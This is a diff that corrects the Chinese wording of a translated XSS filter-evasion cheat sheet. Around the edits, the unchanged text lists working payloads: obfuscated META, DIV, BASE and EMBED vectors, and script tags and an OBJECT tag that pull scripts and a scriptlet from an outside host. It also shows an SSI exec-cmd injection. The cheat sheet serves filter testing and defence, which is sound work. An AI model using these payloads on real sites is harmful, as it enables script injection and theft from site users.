@@ -464,7 +464,7 @@ Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是在不�
 
 -----
 ##匿名html标签的属性##
-IE6.0 和使用了ix渲染引擎的Netscape 8.1+ 并不会关心你建立的html标签存在与否。只要它是以尖括号以及字符开始的。
+IE6.0 和使用了ie渲染引擎的Netscape 8.1+ 并不会关心你创建的html标签存在与否。只要它是以尖括号以及字符开始的。
 
     <XSS STYLE="xss:expression(alert('XSS'))">
 
@@ -476,19 +476,19 @@ IE6.0 和使用了ix渲染引擎的Netscape 8.1+ 并不会关心你建立的html
 
 ----
 ##US-ASCII编码##
-US-ASCII 编码 (发现被 Kurt Huwig)。它是使用畸形的ASCII 编码用7bits代替8bits. 这个xss可以绕过绝大多数内容过滤，但是必须当前域的传输形式为 US-ASCII编码方式。或者你自己去设置这种编码方式 。它是有用的去绕过web应用防火墙xss过滤比服务器端的过滤。Apache的 Tomcat是众所周知的 使用US-ASCII编码传输协议。
+US-ASCII 编码 (发现被 Kurt Huwig)。它是使用畸形的ASCII 编码用7bits代替8bits. 这个xss可以绕过绝大多数内容过滤，但是必须当前域的传输形式为 US-ASCII编码方式。或者你自己将当前页面设置为种编码方式 。它是更加有用的去绕过web应用防火墙xss过滤比服务器端的过滤。Apache的 Tomcat是众所周知的 使用US-ASCII编码传输协议。
 
     ¼script¾alert(¢XSS¢)¼/script¾
 
 ----
 ##META##
-关于meta refresh比较奇怪的是他并不是发送一个刷新请求头。因此他通常用于不需要引用url的攻击。
+关于meta refresh比较奇怪的是它并不会发送一个刷新请求头。因此它通常用于那些不需要引用url的攻击。
 
     <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
 
 -----
 ##META using data##
- URL指令方案，它是非常的不错因为赢没有明显的SCRIPT单词或是JavaScript 指令出现，因为它使用了base64 编码。请查看 [RFC 2397][6]了解更多信息或是编码你的代码。你也可以使用 [XSS calculator][7]去编码你的html或是javascript代码到base64位。
+ URL指令方案是非常的不错，因为它没有明显的SCRIPT单词或是JavaScript 指令出现，而是使用了base64 编码。请查看 [RFC 2397][6]了解更多信息或是编码你的代码。你也可以使用 [XSS calculator][7]去编码你的html或是javascript代码到base64编码。
 
     <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
 
@@ -512,7 +512,7 @@ IFrames或其他元素可以使用事件如下（提出被 David Cross）
 
 ----
 ##FRAME##
-Frames有一些列相同的问题像 iframes
+Frames有一系列像iframes一样的问题
 
     <FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
 
@@ -533,50 +533,50 @@ Frames有一些列相同的问题像 iframes
     <DIV STYLE="background-image: url(javascript:alert('XSS'))">
 
 ----
-##使用 unicoded编码xss利用代码的DIV background-image##
-这是被轻微的修改去混淆 url 参数。他是最早被发现被 Renaud Lifchitz用于攻击hotmail。
+##使用 unicoded编码xss利用代码在DIV background-image##
+它是被轻微的修改去混淆 url 参数。最早被发现被 Renaud Lifchitz用于攻击hotmail。
     <DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
 
 -----
-##附加额外字符的DIV background-image##
-Rnaske开发了一个XSS fuzzer去探测可以在开括号和javascript之间加入哪些额外字符在 IE和安全模式下的 Netscape 8.1。都是一些十进制的字符，但是你也可以用十六进制来填充。（下面这些编码字符可以被使用：1-32, 34, 39, 160, 8192-8.13, 12288, 65279）
+##附加额外字符在DIV background-image##
+Rnaske开发了一个XSS fuzzer去探测可以在开括号和javascript之间加入哪些额外字符在 IE和安全模式下的 Netscape 8.1。这里都是一些十进制的字符，但是你也可以用十六进制来填充。（下面这些编码字符可以被使用：1-32, 34, 39, 160, 8192-8.13, 12288, 65279）
 
     <DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
     
 -----
 ##DIV expression##
-它的一个变体是更加有效的去绕过实际的xss过滤器是在冒号和表达式之间添加换行符。
+在冒号和表达式之间添加换行符是一个更加有效的去绕过实际的xss过滤器的表达式变体。
 
     <DIV STYLE="width: expression(alert('XSS'));">
     
 -----
 ##html条件选择注释块##
-只能工作在IE5.0 以及更新版或是使用了ie渲染引擎的Netscape 8.1 。 一些网站认为任何包裹在注释中的内容都是安全的，因此并不会被移除。这将允许我们的xss向量。或者系统可能通过添加注释对某些内容去试图无害的渲染它。如我们所见，这有时并不起作用。
+只能工作在IE5.0 以及更高版或是使用了ie渲染引擎的Netscape 8.1 。 一些网站认为任何包裹在注释中的内容都是安全的，因此它们并不会被移除。这将使我们的xss向量可使用。或者系统可能对某些内容添加注释去试图无害的渲染它。如我们所见，这有时并不起作用。
 
     <!--[if gte IE 4]>
     <SCRIPT>alert('XSS');</SCRIPT>
-     <![endif]-->
+    <![endif]-->
 
 -----
 ##BASE标签##
-工作ie或是使用了安全模块的Netscape 8.1，你需要使用 "//" 斜体文本去避免javascript错误。这需要当前网站使用相对路径（例如images/image.jpg）而不是绝对路径。如果路径开始用一个斜杠（例如"/images/image.jpg"），你需要去掉xss向量中的一个斜杠（只有在两个斜杠的情况下才会起到注释作用）
+工作在ie或是使用了安全模块的Netscape 8.1，你需要使用 "//"去避免javascript错误。它需要当前网站使用相对路径（例如images/image.jpg）而非绝对路径。如果路径开始用一个斜杠（例如"/images/image.jpg"），你需要去掉xss向量中的一个斜杠（只有在两个斜杠的情况下才会起到注释作用）
 
     <BASE HREF="javascript:alert('XSS');//">
     
 -----
 ##OBJECT标签##
-如果允许objects标签，你也可以注入病毒payloads去感染用户。类似于APPLET标签。这个链接文件是一个包含xss代码的html文件。
+如果允许object标签，那么你也可以注入病毒payloads去感染用户。类似于APPLET标签。下面这个链接文件是一个包含xss代码的html文件。
 
     <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
 
 -----
 ##使用一个你可以载入包含有xss代码的flash文件的 EMBED 标签##
-点击这个demo，如果你加入属性allowScriptAccess="never" and allownetworking="internal"他可以缓解这个风险（谢谢Jonathan Vanasco 的这个信息）
+点击这个demo，如果你加入属性allowScriptAccess="never" and allownetworking="internal"，则可以缓解这个风险（谢谢Jonathan Vanasco 提供的这个信息）
 
     <EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
     
 -----
-##使用在flash中的ActionScript可以混淆你的xss向量##
+##在flash中使用ActionScript可以混淆你的xss向量##
 
     a="get";
     b="URL(\"";
@@ -586,7 +586,7 @@ Rnaske开发了一个XSS fuzzer去探测可以在开括号和javascript之间加
     
 -----
 ## CDATA混淆的 XML数据岛##
-这个xss向量尽可以在IE 和使用了ie渲染引擎的 Netscape 8.1 下工作。它是 Sec Consult在审计雅虎时发现。
+这个xss向量仅可以在IE 和使用了ie渲染引擎的 Netscape 8.1 下工作。它是 Sec Consult在审计雅虎网站时发现。
 
     <XML SRC="xsstest.xml" ID=I></XML>
     <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
@@ -594,12 +594,13 @@ Rnaske开发了一个XSS fuzzer去探测可以在开括号和javascript之间加
 ----
 ##使用XML数据岛生成含有javascript代码的当前域xml文件##
 它是相同的同上面仅仅代替XML文件为当前域文件。你可以看到结果在下面。
+
     <XML SRC="xsstest.xml" ID=I></XML>
     <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
 
 ----
 ##HTML+TIME 在XML中##
-它展示的 Grey Magic 是怎样攻击 Hotmail 和 Yahoo!的。它是仅仅可以工作在ie和使用了ie渲染引擎的Netscape 8.1。并且这段代码需要放在html域body标签之间。
+它展示了 Grey Magic 曾将是怎样攻击 Hotmail 和 Yahoo!的。它是仅仅可以工作在ie和使用了ie渲染引擎的Netscape 8.1。并且这段代码需要放在html与body标签之间。
 
     <HTML><BODY>
     <?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
@@ -609,19 +610,19 @@ Rnaske开发了一个XSS fuzzer去探测可以在开括号和javascript之间加
     
 -----
 ##简单的修改字符去绕过过滤器对 ".js"的过滤##
-你可以重命名你的javascript文件为一个图片作为xss向量
+在xss向量你可以重命名你的javascript文件为一个图片
 
     <SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
 
 ----
 ##SSI (服务器端包含)##
-这需要SSI被安装在服务器端去使用这个xss向量。但可能我并不需要提及这点，因为如果你可以运行命令在服务器端，那么毫无异味会有更加严重的问题存在。
+这需要SSI被安装在服务器端去使用这个xss向量。但可能我并不需要提及这点，因为如果你可以运行命令在服务器端，那么毫无疑问会有更加严重的问题存在。
 
     <!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
 
 -----
 ##PHP##
-需要php被安装在服务器端去使用这个xss向量。同样的，如果你可以运行恩任何远程脚本，那么将会有更加严重的问题。
+需要php被安装在服务器端去使用这个xss向量。同样的，如果你可以运行任何远程脚本，那么将会有更加严重的问题。
 
     <? echo('<SCR)';
     echo('IPT>alert("XSS")</SCRIPT>'); ?>
